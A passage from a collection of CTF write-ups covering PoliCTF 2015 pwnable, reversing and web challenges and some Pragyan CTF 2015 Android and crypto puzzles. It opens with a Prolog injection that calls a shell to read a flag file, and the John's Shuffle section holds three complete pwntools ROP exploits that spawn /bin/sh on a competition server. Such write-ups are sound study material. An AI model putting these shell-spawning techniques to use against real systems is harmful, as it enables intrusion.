>0), L = 'shel',K = 'l',atom_concat(L,K,M),call(M,'cat /home/ctf/haas/jhknsjdfhef_flag_here'), hanoi(0
>flag{Pr0gramm1ng_in_l0g1c_1s_c00l}
>```

## Other write-ups and resources

* <http://www.mrt-prodz.com/blog/view/2015/07/polictf-2015---hanoi-as-a-service-50pts-writeup>
* <https://ctf-team.vulnhub.com/polictf-2015-hanoi-as-a-service/>
* <https://github.com/professormahi/CTF/blob/master/polictf-2015/Pwnable/HAAS/README.md>
* <http://b0rk.nl/ctf/2015/polictf/hanoi-as-a-service.html>
* <http://afnom.net/2015/07/12/HAAS.html>
* <http://nandynarwhals.org/2015/07/12/polictf-2015-hanoi-as-a-service-pwnable-50/> (down)
* <http://pequalsnp-team.github.io/writeups/hanoi/>
* <https://0x90r00t.com/2015/07/13/polictf-2015-pwn50-hanoi-as-a-service-write-up/>
* <http://fadec0d3.blogspot.de/2015/07/polictf-2015-hanoi-as-service-50.html>
* <http://fritzfs.blogspot.de/2015/07/writeup-haas-hanoi-as-service-polictf.html>
* <http://pastebin.com/0bnQ4V5g>
# PoliCTF 2015: John Pastry Shop

**Category:** Pwnable
**Points:** 100
**Solves:** 61
**Description:**

> Among his hobbies, John likes baking cakes to eat during the warm afternoons in Milan. He is damn good at this such that, a couple of months ago, he decided to open a pastry shop on his own. The shop was an immediate success and John needed to bake just so many cakes that he decided to outsource the production of his famous NewYorkCheeseCake to another external and trusted pastry shop, the Shamano's (see shamanoPastryShop.pem). John provided Shamano's with the original basic recipe of his Cake (see Cake.java) and, after his customization, Shamano returns to John a cake container holding the NewYorkCheeseCake (see ShamanoCakeContainerEncoded.jar). Notice that Shamano has to follow John's directions carefully and that is why he always have to encode properly his cake containers so that John can verify all of them accordingly to a fixed decoding process (see extract of source code in Decode.java). John always tries his best for verifying the quality and genuineness of the incoming NewYorkCheeseCake but, you know, to busy people, like he is, it may sometimes happen to forget to check something... You can find the shop at
> pastry.polictf.it:80

>> GPG key: TudCiamvirkemweiDriacItVaxIkAwl@

> [john-pastry-shop](john-pastry-shop_a9e4f9cf6282606f5201aeafd53bfda0.tar.gz.gpg)

## Write-up

(TODO)

## Other write-ups and resources

* <http://nandynarwhals.org/2015/07/13/polictf-2015-john-pastry-shop-pwnable-100/>
* <https://zeta-two.com/ctf/2015/07/14/polictf-writeup.html#pwnable100-john-pastry-shop> or <https://github.com/ZetaTwo/zetatwocom/blob/master/_posts/ctf/2015-07-14-polictf-writeup.md>
* <http://b0rk.nl/ctf/2015/polictf/john-pastry-shop.html>
* <http://blog.atx.name/polictf2015/#john-pastry-shop>
* <https://groups.google.com/a/skullspace.ca/forum/#!topic/ctf/RqbQnbJF5aQ>
# PoliCTF 2015: John's Library

**Category:** Pwnable
**Points:** 150
**Solves:** 86
**Description:**

> Do you like reading books? here we have the best collection ever! you can even save some books for future reading!! enjoy noob!
> library.polictf.it:80

>> GPG key: yowlijOshSuftEvawvIshgugdecWikBi

> [johns-library](johns-library_141fd0852dd13d3c5c3a08330cf24886.tar.gz.gpg)

## Write-up

This writeup is based on following writeups:

* <https://ctf-team.vulnhub.com/polictf-2015-johns-library/> (Common understanding)
* <https://github.com/thebarbershopper/ctf-writeups/tree/master/polictf-2015/johns-library> (Common + Detailed understanding + Cool exploit)
* <http://www.bannsecurity.com/index.php/home/10-ctf-writeups/11-polictf-2015-john-s-library> (Detailed understanding)
* <http://blog.morganz.me/blog/2015/07/15/polictf-2015-pwnable150-johns-library-writeup/> (IDA decompiled source + Stack graph explanation)

### Meta

Keywords:

* Stack Buffer Overflow `sbo`
* Integer Underflow `iu`

We are given GPG encrypted data that we decrypt using the GPG key provided in the description:

```bash
$ file johns-library_141fd0852dd13d3c5c3a08330cf24886.tar.gz.gpg 
johns-library_141fd0852dd13d3c5c3a08330cf24886.tar.gz.gpg: GPG symmetrically encrypted data (AES256 cipher)
$ gpg -o ./johns-library_141fd0852dd13d3c5c3a08330cf24886.tar.gz -d ./johns-library_141fd0852dd13d3c5c3a08330cf24886.tar.gz.gpg 
gpg: AES256 encrypted data
gpg: gpg-agent is not available in this session
Enter passphrase: <yowlijOshSuftEvawvIshgugdecWikBi>
gpg: encrypted with 1 passphrase
$ file johns-library_141fd0852dd13d3c5c3a08330cf24886.tar.gz
johns-library_141fd0852dd13d3c5c3a08330cf24886.tar.gz: gzip compressed data, from Unix, last modified: Thu Jun 18 00:09:08 2015
$ tar xvf johns-library_141fd0852dd13d3c5c3a08330cf24886.tar.gz 
johns-library/
johns-library/johns-library
$ cd johns-library/
$ file johns-library 
johns-library: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=be781865612b01299b9ca38fdb0444b9c2f16c62, not stripped
```

We are given a i386 32bit non-stripped ELF for Linux.

Running it:

```bash
$ ./johns-library 
Welcome to the jungle library mate! Try to escape!!
 
 r - read from library
 a - add element
 u - exit
a
Hey mate! Insert how long is the book title: 
5
hello
 
 r - read from library
 a - add element
 u - exit
r
Insert the index of the book you want to read: 0
hello 
 r - read from library
 a - add element
 u - exit
r
Insert the index of the book you want to read: 1
 
 r - read from library
 a - add element
 u - exit
u
bye bye!
```

We can `a`dd book titles providing a length and title and `r`ead them later using the book index. If we don't want to use the service anymore, we can exit it with `u`.

Let's have a look at `checksec`:

```bash
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

Only partial RELRO and everything else is turned off. A Stack Buffer Overflow or Format String is most likely our target vulnerability.

Let's have a look at functions and objects in our binary using `radare2`:

```bash
$ r2 ./johns-library 
 -- Run your own r2 scripts in awk using the r2awk program.
[0x08048480]> is | sort -k1 | column -t
45                symbols
[Symbols]
vaddr=0x080483bc  paddr=0x000003bc  ord=078  fwd=NONE  sz=0    bind=GLOBAL   type=FUNC    name=_init
vaddr=0x080483f0  paddr=0x000003f0  ord=001  fwd=NONE  sz=16   bind=GLOBAL   type=FUNC    name=imp.printf
[...]
vaddr=0x08048550  paddr=0x00000550  ord=034  fwd=NONE  sz=0    bind=LOCAL    type=FUNC    name=frame_dummy
vaddr=0x0804857d  paddr=0x0000057d  ord=073  fwd=NONE  sz=196  bind=GLOBAL   type=FUNC    name=main
vaddr=0x08048641  paddr=0x00000641  ord=054  fwd=NONE  sz=103  bind=GLOBAL   type=FUNC    name=read_from_library
vaddr=0x080486a8  paddr=0x000006a8  ord=058  fwd=NONE  sz=197  bind=GLOBAL   type=FUNC    name=add_element_to_library
vaddr=0x0804876d  paddr=0x0000076d  ord=066  fwd=NONE  sz=33   bind=GLOBAL   type=FUNC    name=print_menu
vaddr=0x08048790  paddr=0x00000790  ord=067  fwd=NONE  sz=97   bind=GLOBAL   type=FUNC    name=__libc_csu_init
[...]
vaddr=0x0804a038  paddr=0x00001038  ord=072  fwd=NONE  sz=0    bind=GLOBAL   type=NOTYPE  name=__bss_start
vaddr=0x0804a038  paddr=0x00001038  ord=076  fwd=NONE  sz=0    bind=GLOBAL   type=OBJECT  name=__TMC_END__
vaddr=0x0804a040  paddr=0x00001040  ord=071  fwd=NONE  sz=4    bind=GLOBAL   type=OBJECT  name=stdout@@GLIBC_2.0
vaddr=0x0804a044  paddr=0x00001044  ord=032  fwd=NONE  sz=1    bind=LOCAL    type=OBJECT  name=completed.6590
vaddr=0x0804a048  paddr=0x00001048  ord=046  fwd=NONE  sz=4    bind=GLOBAL   type=OBJECT  name=num
vaddr=0x0804a060  paddr=0x00001060  ord=047  fwd=NONE  sz=512  bind=GLOBAL   type=OBJECT  name=len
vaddr=0x0804a260  paddr=0x0804a260  ord=068  fwd=NONE  sz=0    bind=GLOBAL   type=NOTYPE  name=_end
```

We see the following:

* Four functions have been implemented for the binary: `main`, `read_from_library`, `add_element_to_library` and `print_menu`
* Two global BSS objects stand out: `num` with size `4` and `len` with size `512`. The latter seems to be an array of some sort, looking at its size.

After looking at the graphs of each function with `radare2` (e.g. `VV @ sym.main`), we notice a `gets` call in `add_element_to_library`:

![](./add_element_to_library.png)

By reversing it reading the assembly, setting breakpoints with `gdb` and analysing e.g. by `gdb-peda` guessed arguments or even looking at [decompiled pseudo-C source code](http://blog.morganz.me/blog/2015/07/15/polictf-2015-pwnable150-johns-library-writeup/) (generated by e.g. IDA), you'll see that both functions called in `main` - `read_from_library` and `add_element_to_library` get a pointer to the stack (`esp + 0x1b`) as first and only argument - the stack frame space is reserved in the beginning of main with `sub esp, 0x420`:

![](./main-stack-space.png)

![](./main-arg0.png)


After more reversing, you'll notice the following in `add_element_to_library`:

* `num` contains the number of books already added
* `len` is a global array of integers containing the lengths of each book
* The first line of our input is read using `scanf("%d", input)` and saved later into `len`
* Using the buffer passed from main as an argument for this function, `gets` stores the second line of our input into the buffer address plus the given length
* A check if our input length is greater than `1024` is done before the `gets()` call:
```bash
Hey mate! Insert how long is the book title: 
1024
hi
 
 r - read from library
 a - add element
 u - exit
a
Hey mate! Insert how long is the book title: 
1025
Hey you! what are you trying to do??
```
* However, as seen in the decompiled pseudo code or at looking the kind of jump instruction , [`jle`](http://www.mathemainzel.info/files/x86asmref.html#jle), the check is only done for positive numbers. Thus, we can insert negative numbers and thus cause an Integer Underflow `iu` - thus being able to control `EIP`.

For a better visualization, have a look at the stack graph in [this writeup](http://blog.morganz.me/blog/2015/07/15/polictf-2015-pwnable150-johns-library-writeup/).

## Other write-ups and resources

* <https://www.whitehatters.academy/polictf-2015-pwnable-johns-library/>
* <https://ctf-team.vulnhub.com/polictf-2015-johns-library/>
* <https://github.com/thebarbershopper/ctf-writeups/tree/master/polictf-2015/johns-library>
* <http://www.bannsecurity.com/index.php/home/10-ctf-writeups/11-polictf-2015-john-s-library>
* <http://blog.morganz.me/blog/2015/07/15/polictf-2015-pwnable150-johns-library-writeup/>
* <https://bamboofox.torchpad.com/Write-ups/PoliCTF/johns-library>
* <https://gist.github.com/hhc0null/9de4301e197e8ed06259#file-johns_library_exploit-py>
# PoliCTF 2015: John's Shuffle

**Category:** Pwnable
**Points:** 350
**Solves:** 55
**Description:**

> John is completely drunk and unable to protect his poor stack.. Fortunately he can still count on his terrific shuffling skills. Connect to
> shuffle.polictf.it:80
> GPG key: PenOrmunonCerwivpagsyasOwirOjVed
> [http://download.polictf.it/johns-shuffle_ebee3fc8684b5802b681ade5dd06623f.tar.gz.gpg](Download)

## Write-up

by [ezliang](https://github.com/ezliang)

Running file on johns-shuffle:
>```bash
> $ file johns-shuffle
> johns-shuffle: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=8a7ccb88d6259fdf5b193f17dc4d8183ada66b64, not stripped
>```

Checksec:
>```bash
>gdb-peda$ checksec
>CANARY    : disabled
>FORTIFY   : disabled
>NX        : ENABLED
>PIE       : disabled
>RELRO     : Partial
>```

Looks like a 32-bit binary with NX and partial RELRO; this gives an idea of how to approach the exploit.

After tracing through my input, I found that it was being read in through an fgets call here:

>```assembly
> .text:08048F57 mov     dword ptr [esp+4], 44h ; n
> .text:08048F5F lea     eax, [esp+2Ch]
> .text:08048F63 mov     [esp], eax      ; s
> .text:08048F66 call    _fget
>```

The fgets function is being called with a size of 68, and after analyzing the size of the actual array in IDA, we can see that the size is 20 bytes. So after 20 bytes of input we achieve a stack based buffer overflow. Since the binary isn't compiled with a Canary we can simply overwrite the return address.

So next we look for ways to make the binary hit a return instruction. It seems like the main loop breaks when the call to exitcompare returns 1 or if seed\_2 is less than 0. The exitcompare function just seems to check if the first 4 bytes is exactly "exit" and returns 1 if they are. Seed\_2 initially is set to seed\_1 in the shuffle function and is decremented by half of seed_1 each loop. Seed\_1 is also initialized to the current time, which gives us 3 loops before the check fails. But really for all intents and purposes seed\_2 is really just a counter.

Looking at the list of imports, we see a lot of interesting functions such as system, read, write, execv, etc. 
_If you are looking at this in gdb, make sure to enable set follow-fork-mode parent since system(0) is called in shuffle._ So why not use read to write "/bin/sh\0" somewhere into the binary and call system! 

However, during runtime it seems that read@plt instead points to somewhere else:
>```assembly
>[----------------------------------registers-----------------------------------]
>EAX: 0x0 
>EBX: 0xb7784000 --> 0x1abda8 
>ECX: 0x4 
>EDX: 0xb763dee0 (<_IO_puts>:	push   ebp)
>ESI: 0x0 
>EDI: 0x0 
>EBP: 0x41414141 ('AAAA')
>ESP: 0xbff8f510 --> 0xa ('\n')
>EIP: 0x8048690 (<read@plt>:	jmp    DWORD PTR ds:0x804b00c)
>EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
>[-------------------------------------code-------------------------------------]
>   0x8048686:	jmp    DWORD PTR ds:0x804b008
>   0x804868c:	add    BYTE PTR [eax],al
>   0x804868e:	add    BYTE PTR [eax],al
>=> 0x8048690 <read@plt>:	jmp    DWORD PTR ds:0x804b00c
> | 0x8048696 <read@plt+6>:	push   0x0
> | 0x804869b <read@plt+11>:	jmp    0x8048680
> | 0x80486a0 <isnan@plt>:	jmp    DWORD PTR ds:0x804b010
> | 0x80486a6 <isnan@plt+6>:	push   0x8
> |->   0xb763dee0 <_IO_puts>:	push   ebp
>       0xb763dee1 <_IO_puts+1>:	push   edi
>       0xb763dee2 <_IO_puts+2>:	push   esi
>       0xb763dee3 <_IO_puts+3>:	push   ebx
>                                                                  JUMP is taken
>[------------------------------------stack-------------------------------------]
>0000| 0xbff8f510 --> 0xa ('\n')
>0004| 0xbff8f514 --> 0xbff8f5a4 --> 0xbff912e3 ("/home/ubuntu/johns-shuffle")
>0008| 0xbff8f518 --> 0xbff8f5ac --> 0xbff91312 ("XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0")
>0012| 0xbff8f51c --> 0xb77b0cea (<call_init+26>:	add    ebx,0x12316)
>0016| 0xbff8f520 --> 0x1 
>0020| 0xbff8f524 --> 0xbff8f5a4 --> 0xbff912e3 ("/home/ubuntu/johns-shuffle")
>0024| 0xbff8f528 --> 0xbff8f544 --> 0x7049d088 
>0028| 0xbff8f52c --> 0x804b040 --> 0xb75f1990 (<__libc_start_main>:	push   ebp)
>[------------------------------------------------------------------------------]
>Legend: code, data, rodata, value
>0x08048690 in read@plt ()
>gdb-peda$
>```

At first I had found it strange that the binary has no entries in the global offset table section, but it seems to be implementing its own. For those who don't know, the got and plt entries are what allows for binaries to be dynamically linked to external libraries. The shuffle and unshuffle functions then seem to be shifting around the got.plt entries which hold the resolved libc addresses. The shuffle is based on a random seed which is initialized in seed\_1 so each time the binary is run, the libc addresses will be in different areas. However srand is called again with seed\_1 each loop so that the same random number is used for each process.

There are a couple of ways to defeat this, 
1. Leak a libc address and jump to libc instead
2. Predict the pseudorandomness
3. Force the binary into a deterministic state

At first I tried to bruteforce a plt entry until it would be the write function and try to leak a libc address, but it didn't seem work out too well. In the end I realized that you could do #3, I saw the bubble\_sort function and figured that there is only one way that you can sort the got.plt entries and if you could do that, then you would know which plt entries matched up to where and it would be the same no matter how you shuffled it. I just analyzed which entries matched up to where and called those plt entries instead. Once the got.plt was sorted, the shuffle and unshuffle would just undo each other and at the end of the return the entries would stay sorted. Another problem I ended up having was that the I ran out of buffer room but I remedied this by chaning main so I could write more. 

So putting it all together:

>```python
>from pwn import *
>from struct import unpack
>
>context.log_level ="info"
>
>#r = remote('localhost',8888)
>r = remote('shuffle.polictf.it',80)
>padding = "A"*32
>padding2 = "A"*36
>padding3 = "A"*24
>
>bubsort = p32(0x0804891D)
>gotplt = p32(0x0804b00c)
>
>popret = p32(0x8048675)
>pop2ret = p32(0x804901e)
>pop3ret = p32(0x804901d)
>
>system_plt = p32(0x80486c0)
>read_plt = p32(0x8048750)
>
>main = p32(0x08048EBF)
>buff = p32(0x0804B070)
>
>r.send(padding+bubsort+pop2ret+gotplt+p32(25)+main+'\n') #sort the got.plt
>r.send('exit\n')
>
>r.send(padding2+read_plt+pop3ret+p32(0)+buff+p32(8)+main+'\n') #read /bin/sh into somewhere
>r.send('exit\n')
>
>pause(3) #wait for the read to go through
>r.send('/bin/sh\x00')
>
>r.send(padding3+system_plt+popret+buff+system_plt+popret+buff+'\n') #at this point the stack is pretty messed up so this line is pretty yolo
>r.send('exit\n')
>
>r.clean()
>r.interactive()
>```

_flag{rand0mizing_things_with_l0ve}_

## Another solution

by [ctfhacker](https://github.com/ctfhacker)

```
>>> from pwn import *
>>> elf = ELF('johns-shuffle')
    Arch:          i386-32-little
    RELRO:         Partial RELRO
    Stack Canary:  No canary found
    NX:            NX enabled
    PIE:           No PIE
```

## Recon
The first shot at overflowing by throwing a ton of `A`'s worked. We don't actually know what the vulnerbility was, as I didn't open the binary in IDA.

Once we have control of EIP, and the fact that NX is on, we have to start ROP'ing. Using `pwntools`, We immediately see that we have `system` in our binary, but not the string `/bin/sh`. In order to ROP into `system` we have to have a pointer to the string `/bin/sh`. No worries though, because we also have `read` in our binary. 

## Exploit
* Overflow the stack to control EIP.
* ROP into the following chain:
    * `read` to read an additional input of `/bin/sh` into the .bss segment
    * `system` into the .bss segment where we read our `/bin/sh` string
* ???
* Profit

The binary itself randomizes the GOT each connection, so the exploit can take a while to actually land while waiting for our `system` and `read` addresses to line up properly. Give it a bit, and the exploit lands perfectly.

### Exploit code
```python
from pwn import *

elf = ELF('johns-shuffle')
rop = ROP(elf)

add_esp_8 = rop.pivots[8]
system = elf.symbols['system']

# Found system in ELF
log.info("System: {}".format(hex(system)))

# ROP shellcode
# read '/bin/sh' into a known location
# call /bin/sh from known location via system
rop.read(0, elf.bss(), 8)
rop.system(elf.bss())

# Set up our payload 
payload = 'b' * 166
payload += str(rop)
payload += cyclic(1000)

print rop.dump()

log.info("You can walk away.. this might take while..")
log.info("Waiting on the randomization to work")
while True:
    try:
        # r = process('./johns-shuffle')
        with remote('shuffle.polictf.it', 80) as r:

            # Debug code
            '''
            gdb.attach(r, """
            bp {}
            c
            """.format(hex(elf.symbols['read'])))
            '''

            # PWN
            r.sendline(payload)

            # Sleep enough to wait for the read() call to hit
            sleep(0.2)

            # Write /bin/sh in the .bss segment to use with our system() ROP
            r.sendline('/bin/sh\x00')

            # Command to send to our new shell
            r.sendline('cat /home/ctf/flag')

            # Be sure to retrieve the flag from the socket
            for _ in xrange(4):
                output = r.recv()
                if 'flag' in output.lower():
                    log.info('FLAG: {}'.format(output))
                    raw_input()
    except:
        pass
```

## Yet another solution

by [kokjo](https://github.com/kokjo)

The first solution unshuffles the got.plt and the second is a probabilistic attack relying on 2 got.plt entries(read and system) being untouched. Both these exploits are trying to deal with the shuffling, but a much simpler solution can be achieved by remebering what a plt entry looks like:

```
08048690 <read@plt>:
 8048690:       ff 25 0c b0 04 08       jmp    *0x804b00c            Jump to the address from the got.plt
 8048696:       68 00 00 00 00          push   $0x0                  First time? Call the dynamic linker
 804869b:       e9 e0 ff ff ff          jmp    8048680 <_init+0x2c>  
```

So the dynamic linker will lookup the symbol again if we call `read@plt + 6` and thus bypass the got.plt entirely.

## Exploit code
```python
#!/usr/bin/python2
# https://gist.github.com/kokjo/06ef3424ce19815240e3
from pwn import *

e = ELF("./johns-shuffle")
rop = ROP(e)

command = "/bin/sh"

# Bypass the shuffling by forcing the dynamic linker to lookup the symbols again
rop.call(e.plt["read"]+6, [0, e.bss(), len(command)+1])
rop.call(e.plt["system"]+6, [e.bss()])

r = process("./johns-shuffle")
#r = remote('shuffle.polictf.it',80)
r.sendlineafter("mistake..\n", "exit"+ "A"*28 + str(rop))
r.sendafter("\n", command+"\x00")

# ... and we have shell!
r.interactive()
```


## Other write-ups and resources

* <https://ctf-team.vulnhub.com/polictf-2015-johns-shuffle/>
* <https://github.com/thebarbershopper/ctf-writeups/tree/master/polictf-2015/johns-shuffle>
* <http://akiym.hateblo.jp/entry/2015/07/12/192517>
* <http://www.heishou.com.cn/simple/?t187838.html>
# PoliCTF 2015: Verylong

**Category:** Pwnable
**Points:** 500
**Solves:** 13
**Description:**

> verylong.polictf.it:80

>> GPG key: LyromheictyotMeslunidLayttobDoon

> You can use the simulator in this server

>> ssh ctf@vltest.polictf.it oWlnTAzt65wC2snGQ17k

> [verylong](verylong_3c87d4a9e3e2f1f14a02a5cf29d1d580.tar.gz.gpg)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# PoliCTF write-ups

* <http://polictf.it/>
* [Scoreboard](http://polictf.it/scoreboard/) or [local alternative](scoreboard)

## Completed write-ups

* [crypto/exorcise](crypto/exorcise)
* [forensics/its-hungry](forensics/its-hungry)
* [forensics/john-in-the-middle](forensics/john-in-the-middle)
* [pwnable/haas](pwnable/haas)
* [pwnable/johns-library](pwnable/johns-library)
* [pwnable/johns-shuffle](pwnable/johns-shuffle)

## External write-ups only

* [crypto/3doges2](crypto/3doges2)
* [crypto/even-the-server](crypto/even-the-server)
* [crypto/prophet-said](crypto/prophet-said)
* [grab-bag/dropper](grab-bag/dropper)
* [grab-bag/gandgalf](grab-bag/gandgalf)
* [grab-bag/interview](grab-bag/interview)
* [grab-bag/lightning](grab-bag/lightning)
* [grab-bag/trollface](grab-bag/trollface)
* [pwnable/john-pastry-shop](pwnable/john-pastry-shop)
* [reversing/am-i-cheating](reversing/am-i-cheating)
* [reversing/crack-me-if-you-can](reversing/crack-me-if-you-can)
* [reversing/exceptionally](reversing/exceptionally)
* [reversing/john-the-packer](reversing/john-the-packer)
* [reversing/reversemeplz](reversing/reversemeplz)
* [web/magic](web/magic)
* [web/referee](web/referee)
* [web/traveller](web/traveller)

## Missing write-ups

* [forensics/fragmented-key](forensics/fragmented-key)
* [forensics/lost-a-file](forensics/lost-a-file)
* [pwnable/verylong](pwnable/verylong)# PoliCTF 2015: Am I cheating?

**Category:** Reversing
**Points:** 200
**Solves:** 17
**Description:**

> Magic is here right now!! Do you like magic, don't you? So this is your challenge but, as you know, every magic has a trick and a magician never reveals his tricks... Can you see the trick of this magic??? (If a trick actually exist...)
NB This challenge is avaiable only via torrent

>> GPG key: CurthOfodLeivWicyffeinckUdCipsye

## Write-up

(TODO)

## Other write-ups and resources

* <https://blog.spirotot.com/2015/07/13/polictf-2015-am-i-cheating-reversing-writeup/>
# PoliCTF 2015: Crack Me If You Can

**Category:** Reversing
**Points:** 100
**Solves:** 196
**Description:**

> John bets nobody can find the passphrase to login!

>> GPG key: viphHowrirOmbugTudIbavMeuhacyet'

> [crack-me-if-you-can](crack-me-if-you-can_d4e396383e3f64ec7698efaf42f7f32b.tar.gz.gpg)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/polictf-2015-crack-me-if-you-can/>
* <http://www.bannsecurity.com/index.php/home/10-ctf-writeups/10-polictf-2015-crack-me-if-you-can>
* <http://jackson.thuraisamy.me/polictf-2015-android.html>
# PoliCTF 2015: Exceptionally-obfuscated

**Category:** Reversing
**Points:** 400
**Solves:** 5
**Description:**

> Yet another license manager trying to protect a propietary application. The main application calls it with a challenge '84563472956326492361085746284624', the license key, and expects a response that is internally called a 'flag'. I wonder if the've implemented it securely with real crypto or it's just some crap hidden behind a bit of security through obscurity. Only one way to find out...

>> GPG key: DybryepVenarloyRyarEdhobAjElAmoa

> [exceptionally](exceptionally_6fd29dcff0c656b05c635a26c1853b7e.tar.gz.gpg)

## Write-up

(TODO)

## Other write-ups and resources

* <https://towerofhanoi.github.io/polictf2015/reversing/Exceptionally-obfuscated/>
# PoliCTF 2015: John the Packer

**Category:** Reversing
**Points:** 350
**Solves:** 50
**Description:**

> John's greatest skill is to pack everything and everywhere with everyone. He doesn't want that someone reverse his super secret program. So he wrote a magic packing system. Can you show to John that his packing system is not a good anti-reversing solution? N.B. Unfortunately John The Packer has multiple solution, so if you have a solution that is not accepted by the scoreboard (but is accepted by the binary) please contact an OP on IRC

> [john-the-packer](john-the-packer_0828d07d0acfbe7d531b02ddf2e60437.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <http://boaster.github.io/ctf/2015/07/13/poliCTF-John-The-Packer.html>
* <http://v0ids3curity.blogspot.com/2015/07/polictf-re350-john-packer-pin-z3.html>
# PoliCTF 2015: Reversemeplz

**Category:** Reversing
**Points:** 200
**Solves:** 108
**Description:**

> Last month I was trying to simplify an algorithm.. and I found how to mess up a source really really bad. And then this challenge is born. Maybe is really simple or maybe is so hard that all of you will give up. Good luck!

> [reversemeplz](reversemeplz_a61ca13e65f1e121e59e4de4b5411472.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.mrt-prodz.com/blog/view/2015/07/polictf-2015---reversemeplz-200pts-writeup>
* <http://www.bannsecurity.com/index.php/home/10-ctf-writeups/12-polictf-2015-reversemeplz>
* <http://boaster.github.io/ctf/2015/07/12/poliCTF-Reversemeplz.html>
# PoliCTF 2015: Magic Chall

**Category:** Web
**Points:** 350
**Solves:** 67
**Description:**

> I visit this website when I'm sad, contains many magical things that help me to find the solution. Focused on your problem and find "the magic thing" that will help you to solve it.

>   magic.polictf.it  

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.pwntester.com/blog/2015/07/12/polictf-2015-web350-magic-chall/>
* <https://zeta-two.com/ctf/2015/07/14/polictf-writeup.html#web350-magic>
# PoliCTF 2015: John The Referee

**Category:** Web
**Points:** 150
**Solves:** 91
**Description:**

> John is one of the most famous referee and security expert in the world. He loves encryption and his referee uniforms. You can find them on his online store. Unfortunatly his best uniform is not on sale for anyone. I know that it is available only on invitation. I want that uniform!
> referee.polictf.it

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/polictf-2015-john-the-referee/>
* <http://www.pwntester.com/blog/2015/07/12/polictf-150/>
# PoliCTF 2015: John The Traveller

**Category:** Web
**Points:** 100
**Solves:** 112
**Description:**

> Holidays are here! But John still hasn't decided where to spend them and time is running out: flights are overbooked and prices are rising every second. Fortunately, John just discovered a website where he can book last second flight to all the European capitals; however, there's no time to waste, so he just grabs his suitcase and thanks to his new smartphone he looks the city of his choice up while rushing to the airport. There he goes! Flight is booked so... hauskaa lomaa!

> traveller.polictf.it

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.nusgreyhats.org/polictf15-john-the-traveller.html>
* <http://www.pwntester.com/blog/2015/07/12/picoctf-web100/>
* <https://zeta-two.com/ctf/2015/07/14/polictf-writeup.html#web100-john-the-traveller># Pragyan CTF 2015: Fast and Furious

**Category:** Android
**Points:** 100
**Solves** 69
**Description:**

> [fast.apk](fast.apk)

## Write-up

by [polym](https://github.com/abpolym)

After decompiling the `fast.apk` application file, we detect a hardcoded string, `65544231587a52794d3138316458417a636c396d4e44553343673d3d`, in `Main.java`.

Converting this Hex string to an ASCII string, we get `eTB1XzRyM181dXAzcl9mNDU3Cg=`, which is a base64 encoded string.

Base64 Decoding this string results in the flag:

```bash
$ base64 --decode <<< 'eTB1XzRyM181dXAzcl9mNDU3Cg='
y0u_4r3_5up3r_f457
```

The flag is `y0u_4r3_5up3r_f457`.

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/pragyan-ctf-2015-android/>
# Pragyan CTF 2015: Hackerz

**Category:** Android
**Points:** 100
**Solves** 75
**Description:**

> Adam and Eve where in the Garden of Eden. Snake offered apple to Eve and that was the first SYN.
>
> [circle.apk](circle.apk)

## Write-up

by [polym](https://github.com/abpolym)

When decompiling the `circle.apk` application file with [jadx](https://github.com/skylot/jadx), we see four Java files:

```bash
$ jadx -x circle.apk
INFO  - output directory: circle
INFO  - loading ...
WARN  - Indent < 0
INFO  - processing ...
INFO  - done
$ tree
.
├── AndroidManifest.xml
└── com
	└── pragyan
		└── circle
			├── Main.java
			├── a.java
			├── b.java
			└── c.java

3 directories, 5 files
```

In `b.java`, we see a base64 encoded string, `eTB1XzRyM180X2g0Y2szcg==`.

By base64 decoding this string, we get the flag:

```bash
$ base64 --decode <<< 'eTB1XzRyM180X2g0Y2szcg=='
y0u_4r3_4_h4ck3r
```

The flag is `y0u_4r3_4_h4ck3r`.

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/pragyan-ctf-2015-android/>
# Pragyan CTF 2015: Crack this

**Category:** Cryptography
**Points:** 30
**Solves** 8
**Description:**

> 'We' do better than 'You'
>
> [problem.txt](problem.txt)

## Write-up

by [polym](https://github.com/abpolym)

The ciphertext `qsbfvdmdpjtmamrY` is encrypted with the Playfair cipher.

We can use an [online tool](http://rumkin.com/tools/cipher/playfair.php) to decrypt the ciphertext:

![](playfair.png)
![](cleartext.png)

The flag is `pragyanctfrocksX`.

## Other write-ups and resources

* none yet
# Pragyan CTF 2015: Haunted 1's

**Category:** Cryptography
**Points:** 20
**Solves** 33
**Description:**

> Find the {flag}.
>
> [crypted.txt](crypted.txt)

## Write-up

by [polym](https://github.com/abpolym)

We notice that the numbers in the ciphertext are only `0` or in the range `2-9`.
The number `1` is missing, hence the task name `Haunted 1's`.
So we replace everything that is not `0` with `1` and decode the resulting binary text into an ASCII string:

```bash
$ cat crypted.txt | sed 's/[1-9]/1/g' | perl -lpe '$_=pack"B*",$_'
the flag is {NiCe_0bsErvaTion}
```

The flag is `{NiCe_0bsErvaTion}`.

## Other write-ups and resources

* none yet
# Pragyan CTF 2015: One More Headache

**Category:** Cryptography
**Points:** 20
**Solves** 41
**Description:**

> This is a PRGYAN event
>
> [substitution.txt](substitution.txt)

## Write-up

by [polym](https://github.com/abpolym)

We substitute the given ciphertext letters with the "new" alphabet `prgyanbcdefhijklmnoqstuvwxz`. Proof of concept is `switch.py`:

```bash
$ python switch.py
ilovectf
```

The flag is `ilovectf`.

## Other write-ups and resources

* none yet
# Pragyan CTF 2015: Roman

**Category:** Cryptography
**Points:** 10
**Solves** 119
**Description:**

> [question2.tar.gz](question2.tar.gz)

## Write-up

by [polym](https://github.com/abpolym)

After extracting the gzipped tar archive using `tar xzvf question2.tar.gz`, we are given two files, `clue` and `encrypt`:

